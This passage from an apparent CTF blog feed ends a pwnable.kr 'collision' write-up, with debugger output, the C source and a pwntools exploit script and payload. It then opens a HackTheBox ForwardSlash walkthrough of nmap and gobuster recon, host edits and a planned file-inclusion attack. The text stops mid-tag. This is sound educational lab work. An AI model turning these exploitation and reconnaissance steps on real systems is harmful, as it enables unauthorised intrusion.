0x46464645</span></span><br><span class="line"><span class="function">$rbx   : 0x0</span></span><br><span class="line"><span class="function">$rcx   : 0x1</span></span><br><span class="line"><span class="function">$rdx   : 0x10</span></span><br><span class="line"><span class="function">$rsp   : 0x00007fffffffe090  →  0x00007fffffffe198  →  0x00007fffffffe45d  →  &quot;/home/hugo/pwnable.kr/collision/col&quot;</span></span><br><span class="line"><span class="function">$rbp   : 0x00007fffffffe0a0  →  0x0000555555555260  →  &lt;__libc_csu_init+0&gt; endbr64</span></span><br><span class="line"><span class="function">$rsi   : 0x00007fffffffe198  →  0x00007fffffffe45d  →  &quot;/home/hg8/pwnable.kr/collision/col&quot;</span></span><br><span class="line"><span class="function">$rdi   : 0x00007fffffffe481  →  &quot;AAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class="line"><span class="function">$rip   : 0x0000555555555229  →  &lt;main+118&gt; mov rdx, QWORD PTR [rip+0x2e18]        # 0x555555558048 &lt;hashcode&gt;</span></span><br><span class="line"><span class="function">$r8    : 0x0</span></span><br><span class="line"><span class="function">$r9    : 0x00007ffff7fe22c0  →  &lt;_dl_fini+0&gt; endbr64</span></span><br><span class="line"><span class="function">$r10   : 0x000055555555442f  →  0<span class="title">x73006e656c727473</span> <span class="params">(<span class="string">&quot;strlen&quot;</span>?)</span></span></span><br><span class="line"><span class="function">$r11   : 0x00007ffff7f504a0  →  &lt;__strlen_avx2+0&gt; endbr64</span></span><br><span class="line"><span class="function">$r12   : 0x0000555555555070  →  &lt;_start+0&gt; endbr64</span></span><br><span class="line"><span class="function">$r13   : 0x0</span></span><br><span class="line"><span class="function">$r14   : 0x0</span></span><br><span class="line"><span class="function">$r15   : 0x0</span></span><br><span class="line"><span class="function">$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="function">$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000</span></span><br><span class="line"><span class="function">──────────────────────────────────────────────────────────────────────────────────────────────────── <span class="built_in">stack</span> ────</span></span><br><span class="line"><span class="function">0x00007fffffffe090│+0x0000: 0x00007fffffffe198  →  0x00007fffffffe45d  →  &quot;/home/hg8/pwnable.kr/collision/col&quot; ← $rsp</span></span><br><span class="line"><span class="function">0x00007fffffffe098│+0x0008: 0x0000000200000000</span></span><br><span class="line"><span class="function">0x00007fffffffe0a0│+0x0010: 0x0000555555555260  →  &lt;__libc_csu_init+0&gt; endbr64   ← $rbp</span></span><br><span class="line"><span class="function">0x00007fffffffe0a8│+0x0018: 0x00007ffff7e15002  →  &lt;__libc_start_main+242&gt; mov edi, eax</span></span><br><span class="line"><span class="function">0x00007fffffffe0b0│+0x0020: 0x00007fffffffe198  →  0x00007fffffffe45d  →  &quot;/home/hg8/pwnable.kr/collision/col&quot;</span></span><br><span class="line"><span class="function">0x00007fffffffe0b8│+0x0028: 0x0000000200000000</span></span><br><span class="line"><span class="function">0x00007fffffffe0c0│+0x0030: 0x00005555555551b3  →  &lt;main+0&gt; push rbp</span></span><br><span class="line"><span class="function">0x00007fffffffe0c8│+0x0038: 0x00007ffff7e14afd  →  &lt;init_cacheinfo+301&gt; mov rbp, rax</span></span><br><span class="line"><span class="function">────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────</span></span><br><span class="line"><span class="function">   0x55555555521e &lt;main+107&gt;       mov    rax, QWORD PTR [rax]</span></span><br><span class="line"><span class="function">   0x555555555221 &lt;main+110&gt;       mov    rdi, rax</span></span><br><span class="line"><span class="function">   0x555555555224 &lt;main+113&gt;       call   0x555555555169 &lt;check_password&gt;</span></span><br><span class="line"><span class="function"> → 0x555555555229 &lt;main+118&gt;       mov    rdx, QWORD PTR [rip+0x2e18]        # 0x555555558048 &lt;hashcode&gt;</span></span><br><span class="line"><span class="function">   0x555555555230 &lt;main+125&gt;       cmp    rax, rdx</span></span><br><span class="line"><span class="function">   0x555555555233 &lt;main+128&gt;       jne    0x55555555524d &lt;main+154&gt;</span></span><br><span class="line"><span class="function">   0x555555555235 &lt;main+130&gt;       lea    rdi, [rip+0xe07]        # 0x555555556043</span></span><br><span class="line"><span class="function">   0x55555555523c &lt;main+137&gt;       mov    eax, 0x0</span></span><br><span class="line"><span class="function">   0x555555555241 &lt;main+142&gt;       call   0x555555555050 &lt;system@plt&gt;</span></span><br><span class="line"><span class="function">────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span></span><br><span class="line"><span class="function">[#0] Id 1, Name: &quot;col&quot;, stopped 0x555555555229 in <span class="title">main</span> <span class="params">()</span>, reason: SINGLE STEP</span></span><br><span class="line"><span class="function">──────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span></span><br><span class="line"><span class="function">[#0] 0x555555555229 → <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">───────────────────────────────────────────────────────────────────────────────────────────────────────────────</span></span><br><span class="line"><span class="function">gef➤</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure><p>The returns value get stored in <code>$rax</code> :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">→ <span class="number">0x5555555551ac</span> &lt;check_password+<span class="number">67</span>&gt; mov    eax, DWORD PTR [rbp<span class="number">-0xc</span>]</span><br></pre></td></tr></table></figure><p>Then a comparaison between the returned value of <code>check_password</code> and <code>0x21dd09ec</code> is being done:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">→ <span class="number">0x555555555229</span> &lt;main+<span class="number">118</span>&gt;   mov  rdx, QWORD PTR [rip+<span class="number">0x2e18</span>]   # <span class="number">0x555555558048</span> &lt;hashcode&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rdx   : <span class="number">0x21dd09ec</span></span><br></pre></td></tr></table></figure><p>Let’s edit the value we have in <code>$rax</code> to match <code>0x21dd09ec</code> (568134124):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  print $rax</span><br><span class="line">$<span class="number">2</span> = <span class="number">0x46464645</span></span><br><span class="line">gef➤  <span class="built_in">set</span> $rax=<span class="number">568134124</span></span><br></pre></td></tr></table></figure><p>We continue the execution and we can see the bin trying to display the flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">[Detaching after vfork from child process 986]</span><br><span class="line">/bin/cat: flag: No such file or directory</span><br><span class="line">[Inferior 1 (process 916) exited normally]</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure><p>Alright! We now understood the big picture of what’s going on behind the hood and what kind of check is being made by the bin. Let’s now take a look at the source code to find a proper way to exploit the <code>check_password</code> function without using a debugger.</p><h3 id="Source-Code-Analysis"><a href="#Source-Code-Analysis" class="headerlink" title="Source Code Analysis"></a>Source Code Analysis</h3><p>Let’s a take a look at the source now:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">res += ip[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Let’s break things down. First the check of our password:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The function <code>check_password()</code> take our password as argument and should return <code>0x21DD09EC</code> in order to have the flag displayed. In decimal this gives:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; int(<span class="string">&quot;0x21DD09EC&quot;</span>, 16)</span><br><span class="line">568134124</span><br></pre></td></tr></table></figure><p>Let’s now focus on the <code>check_password()</code> function since the magic is happening here.<br>We know it needs to returns <code>568134124</code> in order to pass the check and displays the flag.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">res += ip[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The function is quite short but no so straightforward. </p><p>Let’s decompose line by line to understand what’s going on.</p><ol><li><p>The char pointer passed as parameter is cast to an int pointer: <code>(int*)p;</code>. <code>ip</code> is an array of pointers starting with the pointer to <code>p</code>.<br>Example: <code>char* p = &quot;ABCD&quot; = &quot;\\x41\\x42\\x43\\x44&quot;, int* ip = 0x44434241</code></p></li><li><p>The char array is iterated 4 bytes at a time (4 * 5 = 20 bytes of the passcode), then summed up into <code>res</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">  res += ip[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>The sum results get returned.</p></li></ol><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Manual-exploitation"><a href="#Manual-exploitation" class="headerlink" title="Manual exploitation"></a>Manual exploitation</h3><p>So we understood we need our passcode 5 parts sum to be equal to <code>0x21DD09EC</code>. Now it’s math time!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0x21DD09EC</span></span><br><span class="line"><span class="number">568134124</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">568134124</span> / <span class="number">5</span></span><br><span class="line"><span class="number">113626824</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">568134124</span> - <span class="number">4</span> * <span class="number">113626824</span></span><br><span class="line"><span class="number">113626828</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">4</span> * <span class="number">113626824</span> + <span class="number">113626828</span></span><br><span class="line"><span class="number">568134124</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="number">113626824</span>)</span><br><span class="line"><span class="string">&#x27;0x6c5cec8&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="number">113626828</span>)</span><br><span class="line"><span class="string">&#x27;0x6c5cecc&#x27;</span></span><br></pre></td></tr></table></figure><p>Alright, we have all the 4 parts of our password. Since we are working with C, integers are stored in little-endian format. Therefore the byte order of the integers need to be reversed. </p><p>Using Python this gives:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -c <span class="string">&#x27;print &quot;\xc8\xce\xc5\x06&quot; * 4 + &quot;\xcc\xce\xc5\x06&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$</span><br></pre></td></tr></table></figure><p>Nothing gets printed since those are non-printable chars. </p><p>Let’s now use it to solve the challenge:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">col@pwnable:~$ ./col $(python -c <span class="string">&#x27;print &quot;\xc8\xce\xc5\x06&quot; * 4 + &quot;\xcc\xce\xc5\x06&quot;&#x27;</span>)</span><br><span class="line">daddy! I just managed to create a <span class="built_in">hash</span> collision :)</span><br></pre></td></tr></table></figure><h3 id="Using-pwntools"><a href="#Using-pwntools" class="headerlink" title="Using pwntools"></a>Using pwntools</h3><p>A simple challenge like this one is a good occasion to try our hand on <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a> which can probably comes very useful in the future for more complex challenges.</p><blockquote><p>Pwntools is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.</p></blockquote><p>After installing the tool let’s create a simple script to solve the challenge. </p><p>First let’s connect to the server:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">server = ssh(<span class="string">&#x27;col&#x27;</span>, <span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">2222</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br></pre></td></tr></table></figure><p>Pop a shell and run <code>./col</code> process with our payload as argument. Here we use the very useful pack function from pwnlib in order to convert our hex values to little endian:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell = server.process([<span class="string">&#x27;./col&#x27;</span>, p32(<span class="number">0x6c5cec8</span>) * <span class="number">4</span> + p32(<span class="number">0x6c5cecc</span>)])</span><br></pre></td></tr></table></figure><p>After closing the connection and printing the result the final script looks like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">server = ssh(<span class="string">&#x27;col&#x27;</span>, <span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">2222</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">shell = server.process([<span class="string">&#x27;./col&#x27;</span>, p32(<span class="number">0x6c5cec8</span>) * <span class="number">4</span> + p32(<span class="number">0x6c5cecc</span>)])</span><br><span class="line">result = shell.recvall()</span><br><span class="line">shell.close()</span><br><span class="line">server.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(result.decode(<span class="string">&quot;utf-8&quot;</span>)))</span><br></pre></td></tr></table></figure><p>Running it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python pwntools-exp.py</span><br><span class="line">[+] Connecting to pwnable.kr on port 2222: Done</span><br><span class="line">[*] col@pwnable.kr:</span><br><span class="line">    Distro    Ubuntu 16.04</span><br><span class="line">    OS:       linux</span><br><span class="line">    Arch:     amd64</span><br><span class="line">    Version:  4.4.179</span><br><span class="line">    ASLR:     Enabled</span><br><span class="line">[+] Starting remote process <span class="string">&#x27;./col&#x27;</span> on pwnable.kr: pid 82641</span><br><span class="line">[+] Receiving all data: Done (52B)</span><br><span class="line">[*] Stopped remote process <span class="string">&#x27;col&#x27;</span> on pwnable.kr (pid 82641)</span><br><span class="line">[*] Closed connection to <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line"></span><br><span class="line">Flag: daddy! I just managed to create a <span class="built_in">hash</span> collision :)</span><br></pre></td></tr></table></figure><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwnable </category>
          
          <category> Toddler&#39;s Bottle </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> collision </tag>
            
            <tag> pwn </tag>
            
            <tag> dynamic analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - ForwardSlash</title>
      <link href="/posts/forwardslash/"/>
      <url>/posts/forwardslash/</url>
      
        <content type="html"><![CDATA[<img width="578" alt="forwardslash-hackthebox" src="https://user-images.githubusercontent.com/9076747/82154121-1d149700-986c-11ea-8a38-5cf4aabb7eb2.png"><p>ForwardSlash just retired on Hackthebox. It was a really cool box but full of rabbit holes. Rated hard difficulty it is a very “CTF-Like” box that could be very frustrating for some but also very fun for others. Globally I really enjoyed this box and learned a few tricks. The only drawbacks of this one is to require users to reset the box after getting the root flag since the root access greatly spoil other users. Unfortunately most users don’t clean up after them leaving the root access wide open and easy. </p><p><strong>Tl;Dr:</strong> The user flag consisted in accessing a backup website location, creating account on it as <code>admin</code>. From there you could exploit a Local File Inclusion (LFI) and XML External Entity Injection (XXE) vulnerability to extract php files containing credentials for <code>chiv</code> user. Next step was to pivot from <code>chiv</code> to <code>pain</code> user by reversing a <code>suid</code> home-made backup manager to display config file backup using a symbolic link.<br>The root flag could be accessed after decrypting a encrypted text file in <code>pain</code> home folder. Having access to the decryption function and using a weak algorithm it was possible to brute-force the key used to encrypt the text file that turn out to contains the password of an encrypted LUKS disk containing the <code>root</code> user SSH private key file.</p><p>The box had 2 ways to access to <code>chiv</code> user and an unintended way to access root flag that I will describe in this write-up.</p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the host file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.183 forwardslash.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC forwardslash.htb      </span><br><span class="line">Nmap scan report <span class="keyword">for</span> forwardslash.htb (10.10.10.183)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Backslash Gang</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.10 seconds</span><br></pre></td></tr></table></figure><p>We have the “classic”: A web app running on port 80 and the SSH port 22 open. </p><p>Opening <code>http://forwardslash.htb/</code> display the following website:</p><p><img src="https://user-images.githubusercontent.com/9076747/79313932-5c646680-7f01-11ea-90d0-0bd591c571f0.png" alt="Forwardslash homepage" title="Forwardslash homepage"></p><p>Another hacked website? </p><p>The message seems to gives us information about the website got compromised:</p><blockquote><p>This was ridiculous, who even uses XML and Automatic FTP Logins</p></blockquote><p>Let’s keep that in mind for later.</p><p>Let’s now run <code>gobuster</code> to see if he can find some juicy files and folders:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://forwardslash.htb/&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htpasswd.php (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.htaccess.php (Status: 403)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br></pre></td></tr></table></figure><p>Nothing? That’s odd… Let’s try with different file extension. First with <code>.xml</code> since it’s stated in the hacker message. Still no results… </p><p>Trying other common extensions until….</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://forwardslash.htb/&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.htaccess.txt (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htpasswd.txt (Status: 403)</span><br><span class="line">/note.txt (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br></pre></td></tr></table></figure><p><code>note.txt</code> that’s not much but it’s a start!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://forwardslash.htb/note.txt</span><br><span class="line">Pain, we were hacked by some skids that call themselves the <span class="string">&quot;Backslash Gang&quot;</span>... I know... That name...</span><br><span class="line">Anyway I am just leaving this note here to say that we still have that backup site so we should be fine.</span><br><span class="line"></span><br><span class="line">-chiv</span><br></pre></td></tr></table></figure><p>It’s a note from one of the website developer. The interesting part is him saying <code>we still have that backup site</code>. Since <code>gobuster</code> didn’t discover any other subdirectories and <code>nmap</code> no other open ports, what remains ? Subdomain probably.</p><p>To give a try let’s add <code>backup.forwardslash.htb</code> to our host file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.183 backup.forwardslash.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>And bingo, opening <code>http://backup.forwardslash.htb/</code> display a login form:</p><p><img src="https://user-images.githubusercontent.com/9076747/79314103-9df51180-7f01-11ea-9bfb-093dbecbb193.png" alt="backup forwardslash login" title="backup forwardslash login"></p><h3 id="ForwardSlash-Backup-Site"><a href="#ForwardSlash-Backup-Site" class="headerlink" title="ForwardSlash Backup Site"></a>ForwardSlash Backup Site</h3><p>First thing I always try when stumbling upon Login form is trying to login with the credentials <code>admin:admin</code>. This time it doesn’t work but an error message is returned:</p><blockquote><p>No account found with that username “admin”.</p></blockquote><p>Might be interesting to keep in mind for later. </p><p>Since there is a register form let’s create an account and connect to this backup platform. </p><p><img src="https://user-images.githubusercontent.com/9076747/79314354-e3b1da00-7f01-11ea-8af2-a2a4605f2b07.png" alt="welcome page backup forwardslash" title="welcome page backup forwardslash"></p><p>We arrive to a dashboard with different options for editing our current accounts and two informations pages. </p><p>Let’s focus on the “Change profile picture” page. Profile picture upload page are often a good way to upload a web shell to a server.</p><h3 id="Method-1-Profile-picture-Local-File-Inclusion"><a href="#Method-1-Profile-picture-Local-File-Inclusion" class="headerlink" title="Method 1: Profile picture Local File Inclusion"></a>Method 1: Profile picture Local File Inclusion</h3><p>Once opening the page we get another message from the <code>pain</code> user:</p><p><img src="https://user-images.githubusercontent.com/9076747/79314465-fe844e80-7f01-11ea-8893-deff73d490eb.png" alt="change picture forwardslash" title="change picture forwardslash"></p><p>While inspecting the source code we can indeed see that both text file and submit button have been set to <code>disabled</code>. </p><p><img src="https://user-images.githubusercontent.com/9076747/79314537-12c84b80-7f02-11ea-9744-8e93f9db3703.png" alt="remove disabled forwardslash"></p><p>From the first look it seems like simply removing the <code>disabled</code> attribute will allow us to use the form. </p><p>Since the form takes an URL as input, let’s open a python web server on our machine to see if the form is making call to the given url:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p><img 